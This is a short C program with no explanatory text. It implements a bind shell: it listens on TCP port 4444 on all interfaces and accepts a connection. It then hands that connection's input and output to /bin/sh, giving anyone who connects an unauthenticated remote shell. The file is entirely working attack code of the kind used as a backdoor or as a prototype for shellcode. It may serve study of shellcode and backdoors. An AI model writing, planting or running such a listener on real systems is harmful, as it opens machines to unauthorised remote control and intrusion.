#include <unistd.h>
#include <netinet/in.h>

int main()
{
	int sockfd, clientfd;
	int port = 4444;
	struct sockaddr_in bind_addr;

	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

	bind_addr.sin_family = AF_INET;
	bind_addr.sin_port = htons(port);
	bind_addr.sin_addr.s_addr = INADDR_ANY;
	bind(sockfd, (struct sockaddr*) &bind_addr, sizeof(bind_addr));

	listen(sockfd, 0);

	clientfd = accept(sockfd, NULL, NULL);

	dup2(clientfd, 0);
	dup2(clientfd, 1);
	dup2(clientfd, 2);

	execve("/bin/sh", NULL, NULL);
	return 0;
}
